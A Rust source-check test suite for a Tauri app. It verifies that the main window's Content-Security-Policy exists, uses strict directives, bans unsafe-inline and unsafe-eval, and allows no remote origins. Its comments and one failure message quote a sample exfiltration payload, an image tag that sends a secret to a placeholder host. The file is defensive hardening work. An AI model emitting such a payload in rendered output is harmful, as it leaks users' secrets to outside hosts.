// SPDX-License-Identifier: AGPL-3.0-or-later
//! Source census over the main window's Content-Security-Policy.
//!
//! The main window holds the conversations, the corpora and the mesh
//! controls, and until this census it was the one window with `"csp":
//! null` — no restraint on what it loads or where it sends, while the
//! mesh-app windows already carried a strict policy built in code
//! (`MESHAPP_CSP`, `src/commands/meshapp.rs`). The exfiltration path
//! this closes is an answer that renders `<img src=https://x/?q=SECRET>`:
//! with no remote origin in any directive, the fetch does not leave.
//!
//! Tauri injects `app.security.csp` into the HTML it serves from its own
//! asset protocol (`tauri-2.11.1/src/manager/mod.rs:438-441`, inside
//! `get_asset`), so this config value is what the shipped window runs
//! under. A `vite dev` page comes from `build.devUrl` over http and is
//! never passed through `get_asset`, so it is not injected into and
//! `devCsp` is not needed.
//!
//! This is a SOURCE check: it reads the config and fails on the three
//! ways the policy can be given away. Watching a live window refuse a
//! remote load is a separate, owed check.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

fn tauri_conf() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("tauri.conf.json")
}

/// The two origins a Tauri IPC call legitimately names: the custom
/// scheme used on macOS/Linux, and the Windows/Android http form. Any
/// other `http:`/`https:`/`ws:`/`wss:` origin is a network egress the
/// main window does not need — see `MESHAPP_CSP`, which names the same
/// two.
const IPC_ORIGINS: &[&str] = &["ipc:", "http://ipc.localhost"];

/// Read `app.security.csp` as a string, or fail naming what was found.
fn policy() -> String {
    let raw = std::fs::read_to_string(tauri_conf()).expect("read tauri.conf.json");
    let conf: serde_json::Value = serde_json::from_str(&raw).expect("parse tauri.conf.json");
    let csp = &conf["app"]["security"]["csp"];
    assert!(
        !csp.is_null(),
        "app.security.csp is null in {}: the main window would run with NO \
         content-security-policy, which is the gap this census exists to hold \
         shut (threat model entry 11)",
        tauri_conf().display()
    );
    csp.as_str()
        .unwrap_or_else(|| panic!("app.security.csp must be a string, found {csp}"))
        .to_string()
}

/// `name -> sources`, from the `a 'self'; b 'none'` grammar.
fn directives(csp: &str) -> BTreeMap<String, Vec<String>> {
    csp.split(';')
        .filter_map(|clause| {
            let mut parts = clause.split_whitespace();
            let name = parts.next()?;
            Some((name.to_string(), parts.map(str::to_string).collect()))
        })
        .collect()
}

#[test]
fn main_window_declares_a_policy_with_the_directives_that_close_entry_11() {
    let csp = policy();
    let found = directives(&csp);
    for required in [
        "default-src",
        "script-src",
        "connect-src",
        "img-src",
        "object-src",
        "base-uri",
        "form-action",
    ] {
        assert!(
            found.contains_key(required),
            "app.security.csp names no `{required}` directive; policy is `{csp}`"
        );
    }
    assert_eq!(
        found["default-src"],
        vec!["'self'"],
        "default-src must be exactly 'self'"
    );
    assert_eq!(
        found["object-src"],
        vec!["'none'"],
        "object-src must be exactly 'none'"
    );
    assert_eq!(
        found["base-uri"],
        vec!["'self'"],
        "base-uri must be exactly 'self'"
    );
    assert_eq!(
        found["form-action"],
        vec!["'none'"],
        "form-action must be exactly 'none'"
    );
}

#[test]
fn script_src_carries_neither_unsafe_inline_nor_unsafe_eval() {
    let csp = policy();
    let found = directives(&csp);
    let scripts = found
        .get("script-src")
        .unwrap_or_else(|| panic!("app.security.csp names no `script-src`; policy is `{csp}`"));
    for banned in ["'unsafe-inline'", "'unsafe-eval'"] {
        assert!(
            !scripts.iter().any(|s| s == banned),
            "script-src carries {banned}: injected text in the main window \
             could then execute. script-src is `{}`",
            scripts.join(" ")
        );
    }
}

#[test]
fn no_directive_names_a_remote_origin() {
    let csp = policy();
    for (directive, sources) in directives(&csp) {
        for source in sources {
            let remote = ["http:", "https:", "ws:", "wss:"]
                .iter()
                .any(|scheme| source.starts_with(scheme));
            if !remote {
                continue;
            }
            assert!(
                IPC_ORIGINS.contains(&source.as_str()),
                "directive `{directive}` names remote origin `{source}`. No \
                 remote host belongs in this policy: a remote source is the \
                 exfiltration path threat-model entry 11 is about (an answer \
                 that renders `<img src=https://x/?q=SECRET>`). The only \
                 http-shaped origins allowed are the IPC ones: {IPC_ORIGINS:?}"
            );
        }
    }
}
